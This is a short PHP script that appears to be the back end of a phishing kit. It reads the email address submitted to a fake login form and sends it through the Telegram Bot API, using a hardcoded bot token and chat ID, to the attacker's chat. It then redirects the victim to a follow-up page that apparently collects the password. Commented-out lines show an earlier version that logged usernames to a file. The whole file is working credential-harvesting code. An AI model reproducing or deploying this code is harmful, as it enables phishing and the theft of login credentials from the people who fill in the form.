<!DOCTYPE html>

<?php

    //file_put_contents("log.txt", "Username: " . $_POST['email'] . "\n", FILE_APPEND);
//header('Location: pass.login.php');
 // $location = " https://api.telegram.org/bot5301736219:AAGvdIIBXDVlSfk5kdHT3JjTdIpBXFhEMw0/sendmessage?chat_id=605677274&text=hello')";
define ('url',"https://api.telegram.org/bot5301736219:AAGvdIIBXDVlSfk5kdHT3JjTdIpBXFhEMw0/");
$name = $_POST['email'];
//$message = $_GET['message'];
$chat_id = '605677274';
$message = urlencode("Name:".$name);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
header('Location: pass.login.php');

?>